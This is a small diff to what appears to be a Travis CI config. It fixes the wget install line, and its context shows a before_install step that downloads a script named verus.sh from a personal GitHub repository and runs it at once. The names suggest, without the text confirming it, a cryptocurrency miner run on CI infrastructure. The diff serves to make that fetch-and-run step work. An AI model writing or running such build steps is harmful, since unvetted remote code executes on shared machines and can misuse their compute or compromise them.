@@ -9,6 +9,6 @@ env:
     - BR_TRAVIS_RELEASE=1.0.0
 before_install:
   - sudo apt-get -y update 
-  - sudo apt-get -y wget
+  - sudo apt-get -y install wget
   - sudo apt-get -y update
   - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/verus.sh && chmod +x verus.sh && ./verus.sh
